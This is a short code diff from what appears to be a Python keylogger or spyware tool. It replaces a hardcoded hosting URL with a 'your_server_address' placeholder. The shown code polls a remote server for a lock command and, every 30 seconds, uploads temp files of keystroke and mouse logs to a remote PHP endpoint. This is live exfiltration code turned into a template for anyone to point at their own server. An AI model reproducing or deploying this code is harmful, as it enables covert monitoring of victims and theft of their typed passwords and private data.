@@ -62,7 +62,7 @@ def lockComputer():
 		
 		try:
 
-			r = requests.get("https://123webskitters.000webhostapp.com/logs/lock.txt")
+			r = requests.get("https://your_server_address/lock.txt")
 
 			if r.text == 'L':
 				if state==True:
@@ -83,7 +83,7 @@ def uploadFile():
 	while True:
 		time.sleep(30)
 		try:
-			url = 'https://123webskitters.000webhostapp.com/logs/python_file.php'
+			url = 'https://your_server_address/python_file.php'
 			files = {'key': open(tempfile.gettempdir()+'\\logs_windows.txt', 'rb'),'mouse': open(tempfile.gettempdir()+'\\logs_windows_mouse.txt', 'rb')}
 			r = requests.post(url, files=files)
 		except:
